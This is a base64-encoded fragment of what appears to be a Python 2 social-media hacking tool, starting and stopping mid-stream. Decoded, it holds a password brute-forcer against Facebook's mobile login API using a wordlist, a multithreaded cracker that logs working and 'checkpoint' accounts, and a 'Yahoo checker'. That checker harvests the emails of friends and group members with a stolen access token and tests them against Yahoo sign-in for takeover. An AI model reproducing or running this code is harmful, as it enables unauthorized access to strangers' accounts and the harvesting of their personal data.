AgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5M21bIFwwMzNbMTs5M21PS+Kck1wwMzNbMTs5M20gXSAiK3VzZXIrIiDwn5iBICIgK3Bhc3M3KyIgPT4iK3pbJ25hbWUnXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVzZXIrcGFzczcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrID0gb3Blbigib3V0L3N1cGVyX2NwLnR4dCIsICJhIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlay53cml0ZSh1c2VyKyJ8IitwYXNzNysiXG4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2VrLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M3KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgZXhjZXB0OgogICAgICBwYXNzCiAgICAKICBwID0gVGhyZWFkUG9vbCgzMCkKICBwLm1hcChtYWluLCBpZCkKICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICBwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybURvbmUgXDAzM1sxOzk3bS4uLi4nCiAgcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgT0svQ1AgXDAzM1sxOzkxbTogXDAzM1sxOzkybSIrc3RyKGxlbihva3MpKSsiXDAzM1sxOzk3bS9cMDMzWzE7OTNtIitzdHIobGVuKGNla3BvaW50KSkKICBwcmludCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtQ1AgRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0L3N1cGVyX2NwLnR4dCIpCiAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICBzdXBlcigpCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKIyMjIyMgQlJVVEUgRk9SQ0UgIyMjIyMKZGVmIGJydXRlKCk6CiAgZ2xvYmFsIHRva2V0CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIG9zLnN5c3RlbSgncmVzZXQnKQogIHByaW50IGxvZ28KICB0cnk6CiAgICBlbWFpbCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSURcMDMzWzE7OTdtL1wwMzNbMTs5Mm1FbWFpbFwwMzNbMTs5N20vXDAzM1sxOzkybUhwIFwwMzNbMTs5N21UYXJnZXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCiAgICBwYXNzdyA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtV29yZGxpc3QgXDAzM1sxOzk3bWV4dChsaXN0LnR4dCkgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpCiAgICB0b3RhbCA9IG9wZW4ocGFzc3csInIiKQogICAgdG90YWwgPSB0b3RhbC5yZWFkbGluZXMoKQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtVGFyZ2V0IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2VtYWlsCiAgICBwcmludCAiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWxcMDMzWzE7OTZtICIrc3RyKGxlbih0b3RhbCkpKyIgXDAzM1sxOzkybVBhc3N3b3JkIgogICAgamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCiAgICBzYW5kaSA9IG9wZW4ocGFzc3csInIiKQogICAgZm9yIHB3IGluIHNhbmRpOgogICAgICB0cnk6CiAgICAgICAgcHcgPSBwdy5yZXBsYWNlKCJcbiIsIiIpCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgiXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inLhcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQ3JhY2sgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrcHcpCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKGVtYWlsKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwdykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCiAgICAgICAgbXBzaCA9IGpzb24ubG9hZHMoZGF0YS50ZXh0KQogICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIG1wc2g6CiAgICAgICAgICBkYXBhdCA9IG9wZW4oIkJydXRlLnR4dCIsICJ3IikKICAgICAgICAgIGRhcGF0LndyaXRlKGVtYWlsKyIgfCAiK3B3KyJcbiIpCiAgICAgICAgICBkYXBhdC5jbG9zZSgpCiAgICAgICAgICBwcmludCAiXG5cMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKICAgICAgICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgICAgICAgcHJpbnQoIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWUgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrZW1haWwpCiAgICAgICAgICBwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitwdykKICAgICAgICAgIGtlbHVhcigpCiAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gbXBzaFsiZXJyb3JfbXNnIl06CiAgICAgICAgICBjZWtzID0gb3BlbigiQnJ1dGVjZWtwb2ludC50eHQiLCAidyIpCiAgICAgICAgICBjZWtzLndyaXRlKGVtYWlsKyIgfCAiK3B3KyJcbiIpCiAgICAgICAgICBjZWtzLmNsb3NlKCkKICAgICAgICAgIHByaW50ICJcblwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZvdW5kIgogICAgICAgICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICAgICAgICBwcmludCAiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTNtQWNjb3VudCBDaGVja3BvaW50IgogICAgICAgICAgcHJpbnQoIlwwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtVXNlcm5hbWUgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrZW1haWwpCiAgICAgICAgICBwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitwdykKICAgICAgICAgIGtlbHVhcigpCiAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICBwcmludCJcMDMzWzE7OTFtWyFdIENvbm5lY3Rpb24gRXJyb3IiCiAgICAgICAgdGltZS5zbGVlcCgxKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQgKCJcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kIikKICAgIHRhbnlhdygpCmRlZiB0YW55YXcoKToKICB3aHkgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybUNyZWF0ZSB3b3JkbGlzdCA/IFwwMzNbMTs5Mm1beS9uXVwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQogIGlmIHdoeSA9PSIiOgogICAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciCiAgICB0YW55YXcoKQogIGVsaWYgd2h5ID09InkiOgogICAgd29yZGxpc3QoKQogIGVsaWYgd2h5ID09IlkiOgogICAgd29yZGxpc3QoKQogIGVsaWYgd2h5ID09Im4iOgogICAgbWVudV9oYWNrKCkKICBlbGlmIHdoeSA9PSJOIjoKICAgIG1lbnVfaGFjaygpCiAgZWxzZToKICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIgogICAgdGFueWF3KCkKICAgIAojIyMjIyBZQUhPTyBDSEVDS0VSICMjIyMjCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0jCmRlZiBtZW51X3lhaG9vKCk6CiAgZ2xvYmFsIHRva2V0CiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgdHJ5OgogICAgdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgdGltZS5zbGVlcCgxKQogICAgbG9naW4oKQogIG9zLnN5c3RlbSgncmVzZXQnKQogIHByaW50IGxvZ28KICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzk3bSBXaXRoIGxpc3QgZnJpZW5kIgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIENsb25lIGZyb20gZnJpZW5kIgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIENsb25lIGZyb20gbWVtYmVyIGdyb3VwIgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIFVzaW5nIGZpbGUiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKICBwcmludCAi4pWRIgogIHlhaG9vX3BpbGloKCkKIy0tLS1waWxpaApkZWYgeWFob29fcGlsaWgoKToKICBnbyA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQogIGlmIGdvID09IiI6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyIKICAgIHlhaG9vX3BpbGloKCkKICBlbGlmIGdvID09IjEiOgogICAgeWFob29mcmllbmRzKCkKICBlbGlmIGdvID09IjIiOgogICAgeWFob29mcm9tZnJpZW5kcygpCiAgZWxpZiBnbyA9PSIzIjoKICAgIHlhaG9vbWVtYmVyKCkKICBlbGlmIGdvID09IjQiOgogICAgeWFob29saXN0KCkKICBlbGlmIGdvID09IjAiOgogICAgbWVudV9oYWNrKCkKICBlbHNlOgogICAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmciCiAgICB5YWhvb19waWxpaCgpCiAgICAKIyMjIyMgTElTVCBGUklFTkQgIyMjIyMKZGVmIHlhaG9vZnJpZW5kcygpOgogIGdsb2JhbCB0b2tldAogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICB0cnk6CiAgICBvcy5ta2Rpcignb3V0JykKICBleGNlcHQgT1NFcnJvcjoKICAgIHBhc3MKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICBwcmludCBsb2dvCiAgbXBzaCA9IFtdCiAgam1sID0gMAogIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldHRpbmcgZW1haWwgZnJpZW5kIFwwMzNbMTs5N20uLi4nKQogIHRlbWFuID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQogIGtpbWFrID0ganNvbi5sb2Fkcyh0ZW1hbi50ZXh0KQogIHNhdmUgPSBvcGVuKCdvdXQvTWFpbFZ1bG4udHh0JywndycpCiAgamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCiAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgZm9yIHcgaW4ga2ltYWtbJ2RhdGEnXToKICAgIGptbCArPTEKICAgIG1wc2guYXBwZW5kKGptbCkKICAgIGlkID0gd1snaWQnXQogICAgbmFtYSA9IHdbJ25hbWUnXQogICAgbGlua3MgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWQrIj9hY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgIHogPSBqc29uLmxvYWRzKGxpbmtzLnRleHQpCiAgICB0cnk6CiAgICAgIG1haWwgPSB6WydlbWFpbCddCiAgICAgIHlhaG9vID0gcmUuY29tcGlsZShyJ0AuKicpCiAgICAgIG90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCiAgICAgIGlmICd5YWhvby5jb20nIGluIG90dzoKICAgICAgICBici5vcGVuKCJodHRwczovL2xvZ2luLnlhaG9vLmNvbS9jb25maWcvbG9naW4/LnNyYz1mcGN0eCYuaW50bD1pZCYubGFuZz1pZC1JRCYuZG9uZT1odHRwczovL2lkLnlhaG9vLmNvbSIpCiAgICAgICAgYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUKICAgICAgICBici5zZWxlY3RfZm9ybShucj0wKQogICAgICAgIGJyWyJ1c2VybmFtZSJdID0gbWFpbAogICAgICAgIGtsaWsgPSBici5zdWJtaXQoKS5yZWFkKCkKICAgICAgICBqb2sgPSByZS5jb21waWxlKHInIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPi4qJykKICAgICAgICB0cnk6CiAgICAgICAgICBwZWsgPSBqb2suc2VhcmNoKGtsaWspLmdyb3VwKCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmICcibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+JyBpbiBwZWs6CiAgICAgICAgICBzYXZlLndyaXRlKG1haWwgKyAnXG4nKQogICAgICAgICAgcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm1WVUxO4pyTXDAzM1sxOzk3bSBdIFwwMzNbMTs5Mm0iICttYWlsKyIgXDAzM1sxOzk3bT0+IituYW1hKQogICAgICAgICAgYmVyaGFzaWwuYXBwZW5kKG1haWwpCiAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgIHBhc3MKICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICBwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybURvbmUgXDAzM1sxOzk3bS4uLi4nCiAgcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrc3RyKGxlbihiZXJoYXNpbCkpCiAgcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gb3V0L01haWxWdWxuLnR4dCIKICBzYXZlLmNsb3NlKCkKICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogIG1lbnVfeWFob28oKQoKIyMjIyMgQ0xPTkUgRlJPTSBGUklFTkQgIyMjIyMKZGVmIHlhaG9vZnJvbWZyaWVuZHMoKToKICBnbG9iYWwgdG9rZXQKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgdHJ5OgogICAgb3MubWtkaXIoJ291dCcpCiAgZXhjZXB0IE9TRXJyb3I6CiAgICBwYXNzCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIG1wc2ggPSBbXQogIGptbCA9IDAKICBpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKICB0cnk6CiAgICBqb2sgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICBvcCA9IGpzb24ubG9hZHMoam9rLnRleHQpCiAgICBwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIitvcFsibmFtZSJdCiAgZXhjZXB0IEtleUVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBGcmllbmQgbm90IGZvdW5kIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnVfeWFob28oKQogIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldHRpbmcgZW1haWwgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCiAgdGVtYW4gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWR0KycvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKICBraW1hayA9IGpzb24ubG9hZHModGVtYW4udGV4dCkKICBzYXZlID0gb3Blbignb3V0L0ZyaWVuZE1haWxWdWxuLnR4dCcsJ3cnKQogIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQogIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogIGZvciB3IGluIGtpbWFrWydkYXRhJ106CiAgICBqbWwgKz0xCiAgICBtcHNoLmFwcGVuZChqbWwpCiAgICBpZCA9IHdbJ2lkJ10KICAgIG5hbWEgPSB3WyduYW1lJ10KICAgIGxpbmtzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICB6ID0ganNvbi5sb2FkcyhsaW5rcy50ZXh0KQogICAgdHJ5OgogICAgICBtYWlsID0gelsnZW1haWwnXQogICAgICB5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQogICAgICBvdHcgPSB5YWhvby5zZWFyY2gobWFpbCkuZ3JvdXAoKQogICAgICBpZiAneWFob28uY29tJyBpbiBvdHc6CiAgICAgICAgYnIub3BlbigiaHR0cHM6Ly9sb2dpbi55YWhvby5jb20vY29uZmlnL2xvZ2luPy5zcmM9ZnBjdHgmLmludGw9aWQmLmxhbmc9aWQtSUQmLmRvbmU9aHR0cHM6Ly9pZC55YWhvby5jb20iKQogICAgICAgIGJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCiAgICAgICAgYnIuc2VsZWN0X2Zvcm0obnI9MCkKICAgICAgICBiclsidXNlcm5hbWUiXSA9IG1haWwKICAgICAgICBrbGlrID0gYnIuc3VibWl0KCkucmVhZCgpCiAgICAgICAgam9rID0gcmUuY29tcGlsZShyJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4uKicpCiAgICAgICAgdHJ5OgogICAgICAgICAgcGVrID0gam9rLnNlYXJjaChrbGlrKS5ncm91cCgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgY29udGludWUKICAgICAgICBpZiAnIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPicgaW4gcGVrOgogICAgICAgICAgc2F2ZS53cml0ZShtYWlsICsgJ1xuJykKICAgICAgICAgIHByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtVlVMTuKck1wwMzNbMTs5N20gXSBcMDMzWzE7OTJtIiArbWFpbCsiIFwwMzNbMTs5N209PiIrbmFtYSkKICAgICAgICAgIGJlcmhhc2lsLmFwcGVuZChtYWlsKQogICAgZXhjZXB0IEtleUVycm9yOgogICAgICBwYXNzCiAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwogIHByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iK3N0cihsZW4oYmVyaGFzaWwpKQogIHByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtIG91dC9GcmllbmRNYWlsVnVsbi50eHQiCiAgc2F2ZS5jbG9zZSgpCiAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICBtZW51X3lhaG9vKCkKICAKIyMjIyMgWUFIT08gTUVNQkVSICMjIyMjCmRlZiB5YWhvb21lbWJlcigpOgogIGdsb2JhbCB0b2tldAogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICB0cnk6CiAgICBvcy5ta2Rpcignb3V0JykKICBleGNlcHQgT1NFcnJvcjoKICAgIHBhc3MKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICBwcmludCBsb2dvCiAgbXBzaCA9IFtdCiAgam1sID0gMAogIGlkPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCiAgdHJ5OgogICAgcj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyb3VwLz9pZD0nK2lkKycmYWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICBhc3c9anNvbi5sb2FkcyhyLnRleHQpCiAgICBwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQogIGV4Y2VwdCBLZXlFcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnVfeWFob28oKQogIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldHRpbmcgZW1haWwgZnJvbSBncm91cCBcMDMzWzE7OTdtLi4uJykKICB0ZW1hbiA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnL21lbWJlcnM/ZmllbGRzPW5hbWUsaWQmbGltaXQ9OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK3Rva2V0KQogIGtpbWFrID0ganNvbi5sb2Fkcyh0ZW1hbi50ZXh0KQogIHNhdmUgPSBvcGVuKCdvdXQvR3J1cE1haWxWdWxuLnR4dCcsJ3cnKQogIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQogIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogIGZvciB3IGluIGtpbWFrWydkYXRhJ106CiAgICBqbWwgKz0xCiAgICBtcHNoLmFwcGVuZChqbWwpCiAgICBpZCA9IHdbJ2lkJ10KICAgIG5hbWEgPSB3WyduYW1lJ10KICAgIGxpbmtzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkKyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICB6ID0ganNvbi5sb2FkcyhsaW5rcy50ZXh0KQogICAgdHJ5OgogICAgICBtYWlsID0gelsnZW1haWwnXQogICAgICB5YWhvbyA9IHJlLmNvbXBpbGUocidALionKQogICAgICBvdHcgPSB5YWhvby5zZWFyY2gobWFpbCkuZ3JvdXAoKQogICAgICBpZiAneWFob28uY29tJyBpbiBvdHc6CiAgICAgICAgYnIub3BlbigiaHR0cHM6Ly9sb2dpbi55YWhvby5jb20vY29uZmlnL2xvZ2luPy5zcmM9ZnBjdHgmLmludGw9aWQmLmxhbmc9aWQtSUQmLmRvbmU9aHR0cHM6Ly9pZC55YWhvby5jb20iKQogICAgICAgIGJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCiAgICAgICAgYnIuc2VsZWN0X2Zvcm0obnI9MCkKICAgICAgICBiclsidXNlcm5hbWUiXSA9IG1haWwKICAgICAgICBrbGlrID0gYnIuc3VibWl0KCkucmVhZCgpCiAgICAgICAgam9rID0gcmUuY29tcGlsZShyJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4uKicpCiAgICAgICAgdHJ5OgogICAgICAgICAgcGVrID0gam9rLnNlYXJjaChrbGlrKS5ncm91cCgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgY29udGludWUKICAgICAgICBpZiAnIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPicgaW4gcGVrOgogICAgICAgICAgc2F2ZS53cml0ZShtYWlsICsgJ1xuJykKICAgICAgICAgIHByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtVlVMTuKck1wwMzNbMTs5N20gXSBcMDMzWzE7OTJtIiArbWFpbCsiIFwwMzNbMTs5N209PiIrbmFtYSkKICAgICAgICAgIGJlcmhhc2lsLmFwcGVuZChtYWlsKQogICAgZXhjZXB0IEtleUVycm9yOgogICAgICBwYXNzCiAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwogIHByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iK3N0cihsZW4oYmVyaGFzaWwpKQogIHByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtIG91dC9HcnVwTWFpbFZ1bG4udHh0IgogIHNhdmUuY2xvc2UoKQogIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgbWVudV95YWhvbygpCiAgICAKIyMjIyMgWUFIT08gRklMRSAjIyMjIwpkZWYgeWFob29saXN0KCk6CiAgZ2xvYmFsI